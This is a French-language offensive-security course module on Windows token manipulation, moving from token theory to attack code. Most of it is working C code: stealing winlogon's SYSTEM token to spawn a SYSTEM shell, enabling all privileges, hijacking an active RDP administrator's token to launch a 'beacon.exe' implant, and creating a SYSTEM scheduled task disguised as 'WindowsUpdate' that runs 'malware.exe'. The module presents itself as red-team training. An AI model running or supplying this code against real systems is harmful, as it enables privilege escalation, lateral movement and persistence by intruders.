# 35 - Token Manipulation Windows

## 🎯 Ce que tu vas apprendre

- Comprendre les tokens de sécurité Windows et leur rôle
- Voler et dupliquer des tokens de processus privilégiés
- Élever ses privilèges via token impersonation
- Utiliser les Windows APIs pour manipuler les tokens
- Exploiter les tokens pour le privilege escalation et lateral movement

## 📚 Théorie

### Concept 1 : Qu'est-ce qu'un Token Windows ?

**C'est quoi ?**

Un **token** est un objet noyau qui représente le **contexte de sécurité** d'un processus ou d'un thread. C'est comme une carte d'identité numérique qui définit :
- **Qui** tu es (SID utilisateur)
- **À quels groupes** tu appartiens
- **Quels privilèges** tu possèdes

**Pourquoi ?**

Windows utilise les tokens pour décider si un processus peut effectuer une opération (accéder à un fichier, créer un processus, modifier le registre, etc.).

**Comment ?**

Chaque processus reçoit un token au démarrage. Ce token contient toutes les informations de sécurité héritées de l'utilisateur qui a lancé le processus.

### Concept 2 : Structure d'un Token

**C'est quoi ?**

Un token contient plusieurs composants critiques :

```ascii
TOKEN WINDOWS
┌────────────────────────────────────┐
│ User SID                           │
│ S-1-5-21-xxx-xxx-xxx-1001          │ ← Identifiant unique utilisateur
├────────────────────────────────────┤
│ Groups                             │
│ ├─ Users (S-1-5-32-545)            │
│ ├─ Administrators (S-1-5-32-544)   │ ← Groupes d'appartenance
│ └─ Remote Desktop Users            │
├────────────────────────────────────┤
│ Privileges                         │
│ ├─ SeDebugPrivilege       DISABLED │ ← Injecter dans n'importe quel processus
│ ├─ SeTakeOwnershipPrivilege DISABLED│ ← Prendre possession de fichiers
│ ├─ SeImpersonatePrivilege ENABLED  │ ← Usurper l'identité d'autres processus
│ └─ SeShutdownPrivilege    ENABLED  │ ← Éteindre le système
├────────────────────────────────────┤
│ Integrity Level                    │
│ Medium / High / System             │ ← Niveau d'intégrité
└────────────────────────────────────┘
```

**Pourquoi c'est important ?**

En manipulant un token, on peut :
1. **Élever ses privilèges** (devenir SYSTEM)
2. **Usurper l'identité** d'un autre utilisateur
3. **Activer des privilèges** désactivés

**Comment accéder à un token ?**

Via les Windows APIs :
- `OpenProcessToken()` : Ouvrir le token d'un processus
- `GetTokenInformation()` : Lire les infos du token
- `DuplicateTokenEx()` : Dupliquer un token
- `CreateProcessWithTokenW()` : Créer un processus avec un token volé

### Concept 3 : Token Impersonation

**C'est quoi ?**

L'**impersonation** permet à un thread d'**adopter le contexte de sécurité** d'un autre utilisateur en utilisant son token.

**Pourquoi ?**

Très utilisé en Red Team pour :
- **Privilege escalation** : voler le token d'un processus SYSTEM
- **Lateral movement** : usurper l'identité d'un admin du domaine
- **Persistence** : créer des processus avec des tokens privilégiés

**Comment ?**

1. Trouver un processus privilégié (ex: `lsass.exe` qui tourne en SYSTEM)
2. Ouvrir ce processus avec `OpenProcess()`
3. Récupérer son token avec `OpenProcessToken()`
4. Dupliquer le token avec `DuplicateTokenEx()`
5. Créer un nouveau processus avec ce token : `CreateProcessWithTokenW()`

## 🔍 Visualisation

```ascii
TOKEN IMPERSONATION - Vue d'ensemble

AVANT IMPERSONATION :
┌────────────────────────┐
│ Processus Attaquant    │
│ User: Alice            │
│ Privileges: Medium     │
└────────────────────────┘

┌────────────────────────┐
│ Processus SYSTEM       │
│ User: NT AUTHORITY\SYSTEM│
│ Privileges: TOUS       │
└────────────────────────┘

ÉTAPES DE L'ATTAQUE :

1. Ouvrir le processus SYSTEM
   OpenProcess(PROCESS_QUERY_INFORMATION, ...)

2. Voler son token
   OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)

3. Dupliquer le token
   DuplicateTokenEx(hToken, ..., &hNewToken)

4. Créer processus avec token volé
   CreateProcessWithTokenW(hNewToken, "cmd.exe", ...)

APRÈS IMPERSONATION :
┌────────────────────────┐
│ Nouveau cmd.exe        │
│ User: NT AUTHORITY\SYSTEM│ ← On est SYSTEM !
│ Privileges: TOUS       │
└────────────────────────┘

PRIVILÈGES UTILES POUR RED TEAM

┌─────────────────────────┬──────────────────────────────┐
│ Privilège               │ Usage Red Team               │
├─────────────────────────┼──────────────────────────────┤
│ SeDebugPrivilege        │ Injecter dans tout processus │
│                         │ Dumper LSASS (mimikatz)      │
├─────────────────────────┼──────────────────────────────┤
│ SeImpersonatePrivilege  │ Token impersonation          │
│                         │ Potato attacks               │
├─────────────────────────┼──────────────────────────────┤
│ SeTakeOwnershipPrivilege│ Voler la propriété de        │
│                         │ fichiers système             │
├─────────────────────────┼──────────────────────────────┤
│ SeLoadDriverPrivilege   │ Charger drivers malveillants │
├─────────────────────────┼──────────────────────────────┤
│ SeBackupPrivilege       │ Lire n'importe quel fichier  │
│ SeRestorePrivilege      │ Écrire n'importe où          │
└─────────────────────────┴──────────────────────────────┘
```

## 💻 Exemple pratique

### Exemple 1 : Lire le Token du Processus Courant

```c
#include <windows.h>
#include <stdio.h>

void print_token_info() {
    HANDLE hToken;
    DWORD dwLength;

    // Ouvrir le token du processus courant
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        printf("Erreur OpenProcessToken: %lu\n", GetLastError());
        return;
    }

    // Lire le User SID
    TOKEN_USER *pTokenUser;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwLength);
    pTokenUser = (TOKEN_USER*)malloc(dwLength);

    if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwLength, &dwLength)) {
        LPSTR pszSid;
        ConvertSidToStringSidA(pTokenUser->User.Sid, &pszSid);
        printf("User SID: %s\n", pszSid);
        LocalFree(pszSid);
    }

    // Lire les privilèges
    TOKEN_PRIVILEGES *pTokenPrivs;
    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwLength);
    pTokenPrivs = (TOKEN_PRIVILEGES*)malloc(dwLength);

    if (GetTokenInformation(hToken, TokenPrivileges, pTokenPrivs, dwLength, &dwLength)) {
        printf("\nPrivilèges (%lu) :\n", pTokenPrivs->PrivilegeCount);

        for (DWORD i = 0; i < pTokenPrivs->PrivilegeCount; i++) {
            char szName[256];
            DWORD dwNameLen = sizeof(szName);

            LookupPrivilegeNameA(NULL, &pTokenPrivs->Privileges[i].Luid, szName, &dwNameLen);

            BOOL enabled = pTokenPrivs->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED;
            printf("  [%s] %s\n", enabled ? "✓" : "✗", szName);
        }
    }

    free(pTokenUser);
    free(pTokenPrivs);
    CloseHandle(hToken);
}

int main() {
    print_token_info();
    return 0;
}
```

### Exemple 2 : Voler le Token d'un Processus SYSTEM

```c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

BOOL enable_privilege(LPCSTR privilege) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        return FALSE;
    }

    if (!LookupPrivilegeValueA(NULL, privilege, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

DWORD find_process_by_name(LPCSTR process_name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (lstrcmpiA(pe32.szExeFile, process_name) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0;
}

BOOL steal_system_token() {
    HANDLE hToken, hNewToken, hProcess;
    DWORD dwPid;

    // Activer SeDebugPrivilege pour ouvrir n'importe quel processus
    if (!enable_privilege(SE_DEBUG_NAME)) {
        printf("[-] Impossible d'activer SeDebugPrivilege\n");
        return FALSE;
    }

    printf("[+] SeDebugPrivilege activé\n");

    // Trouver un processus SYSTEM (ex: winlogon.exe)
    dwPid = find_process_by_name("winlogon.exe");
    if (dwPid == 0) {
        printf("[-] Processus winlogon.exe introuvable\n");
        return FALSE;
    }

    printf("[+] winlogon.exe trouvé (PID: %lu)\n", dwPid);

    // Ouvrir le processus
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPid);
    if (!hProcess) {
        printf("[-] Erreur OpenProcess: %lu\n", GetLastError());
        return FALSE;
    }

    // Voler son token
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
        printf("[-] Erreur OpenProcessToken: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Token volé\n");

    // Dupliquer le token
    if (!DuplicateTokenEx(
        hToken,
        MAXIMUM_ALLOWED,
        NULL,
        SecurityImpersonation,
        TokenPrimary,
        &hNewToken
    )) {
        printf("[-] Erreur DuplicateTokenEx: %lu\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Token dupliqué\n");

    // Créer un processus cmd.exe avec le token SYSTEM
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (!CreateProcessWithTokenW(
        hNewToken,
        0,
        L"C:\\Windows\\System32\\cmd.exe",
        NULL,
        0,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        printf("[-] Erreur CreateProcessWithTokenW: %lu\n", GetLastError());
        CloseHandle(hNewToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] cmd.exe lancé en tant que SYSTEM (PID: %lu)\n", pi.dwProcessId);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hNewToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);

    return TRUE;
}

int main() {
    printf("[*] Token Impersonation Demo\n\n");

    if (steal_system_token()) {
        printf("[+] Succès ! Vérifiez le nouveau cmd.exe\n");
    } else {
        printf("[-] Échec\n");
    }

    return 0;
}
```

### Exemple 3 : Activer tous les Privilèges

```c
#include <windows.h>
#include <stdio.h>

BOOL enable_all_privileges() {
    HANDLE hToken;
    TOKEN_PRIVILEGES *pTokenPrivs;
    DWORD dwLength;

    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    // Lire tous les privilèges
    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwLength);
    pTokenPrivs = (TOKEN_PRIVILEGES*)malloc(dwLength);

    if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivs, dwLength, &dwLength)) {
        free(pTokenPrivs);
        CloseHandle(hToken);
        return FALSE;
    }

    // Activer TOUS les privilèges
    for (DWORD i = 0; i < pTokenPrivs->PrivilegeCount; i++) {
        pTokenPrivs->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
    }

    // Appliquer
    BOOL success = AdjustTokenPrivileges(hToken, FALSE, pTokenPrivs,
                                         dwLength, NULL, NULL);

    free(pTokenPrivs);
    CloseHandle(hToken);

    return success;
}

int main() {
    if (enable_all_privileges()) {
        printf("[+] Tous les privilèges activés\n");
    } else {
        printf("[-] Erreur: %lu\n", GetLastError());
    }
    return 0;
}
```

## 🎯 Application Red Team

### Scénario 1 : Privilege Escalation via Token Impersonation

**Contexte :** Accès initial avec un compte utilisateur standard. Objectif : devenir SYSTEM.

**Technique : Potato Attacks**

Windows permet à certains services d'avoir `SeImpersonatePrivilege`. On peut exploiter cela pour voler un token SYSTEM.

```c
// JuicyPotato / RoguePotato technique simplifiée
#include <windows.h>

BOOL potato_attack() {
    // 1. Créer un serveur COM local
    // 2. Trigger une connexion SYSTEM vers notre serveur
    // 3. Voler le token de la connexion SYSTEM
    // 4. Créer un processus avec ce token

    // Code simplifié (voir JuicyPotato pour implémentation complète)
    HANDLE hToken;

    // Attendre connexion SYSTEM...
    // ImpersonateNamedPipeClient() ou CoImpersonateClient()

    // Dupliquer le token
    OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE, TRUE, &hToken);

    HANDLE hNewToken;
    DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                     SecurityImpersonation, TokenPrimary, &hNewToken);

    // Lancer cmd.exe en SYSTEM
    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi;

    CreateProcessWithTokenW(hNewToken, 0, L"cmd.exe", NULL,
                           0, NULL, NULL, &si, &pi);

    return TRUE;
}
```

### Scénario 2 : Lateral Movement avec Token Theft

**Contexte :** Compromis d'un serveur. Un admin du domaine a une session RDP active.

```c
#include <windows.h>
#include <wtsapi32.h>
#pragma comment(lib, "wtsapi32.lib")

BOOL steal_rdp_token(DWORD session_id) {
    HANDLE hToken;

    // Ouvrir le token de la session RDP
    if (!WTSQueryUserToken(session_id, &hToken)) {
        printf("[-] Erreur WTSQueryUserToken: %lu\n", GetLastError());
        return FALSE;
    }

    printf("[+] Token de la session %lu volé\n", session_id);

    // Dupliquer
    HANDLE hNewToken;
    DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                     SecurityImpersonation, TokenPrimary, &hNewToken);

    // Créer processus malveillant avec les droits de l'admin
    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi;

    CreateProcessWithTokenW(hNewToken, 0, L"C:\\Temp\\beacon.exe", NULL,
                           0, NULL, NULL, &si, &pi);

    printf("[+] Beacon lancé en tant qu'admin du domaine\n");

    CloseHandle(hToken);
    CloseHandle(hNewToken);
    return TRUE;
}

int main() {
    // Trouver sessions actives
    PWTS_SESSION_INFO pSessionInfo;
    DWORD dwCount;

    if (WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1,
                            &pSessionInfo, &dwCount)) {
        for (DWORD i = 0; i < dwCount; i++) {
            if (pSessionInfo[i].State == WTSActive) {
                printf("[*] Session active: %lu (%s)\n",
                       pSessionInfo[i].SessionId,
                       pSessionInfo[i].pWinStationName);

                steal_rdp_token(pSessionInfo[i].SessionId);
            }
        }
        WTSFreeMemory(pSessionInfo);
    }

    return 0;
}
```

### Scénario 3 : Persistence via Scheduled Task avec Token

```c
#include <windows.h>
#include <taskschd.h>

BOOL create_scheduled_task_as_system() {
    // Voler token SYSTEM
    HANDLE hToken = ...; // (code précédent)

    // Créer une tâche planifiée qui s'exécute au démarrage
    // avec les privilèges SYSTEM

    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi;

    // Créer schtasks.exe avec token SYSTEM
    CreateProcessWithTokenW(
        hToken,
        0,
        L"schtasks.exe",
        L"/create /tn \"WindowsUpdate\" /tr \"C:\\Temp\\malware.exe\" "
        L"/sc onstart /ru SYSTEM /f",
        0, NULL, NULL, &si, &pi
    );

    return TRUE;
}
```

## 📝 Points clés

1. **Token = carte d'identité de sécurité** d'un processus (User, Groups, Privileges)
2. **Impersonation** permet de voler l'identité d'un autre utilisateur
3. **SeDebugPrivilege** requis pour ouvrir des processus privilégiés
4. **SeImpersonatePrivilege** exploitable via Potato attacks
5. **APIs clés** : OpenProcessToken, DuplicateTokenEx, CreateProcessWithTokenW
6. **Cibles** : winlogon.exe, lsass.exe, services.exe (processus SYSTEM)

## ➡️ Prochaine étape

Module 36 : **Registry Persistence** - Utiliser le registre Windows pour maintenir l'accès après redémarrage.
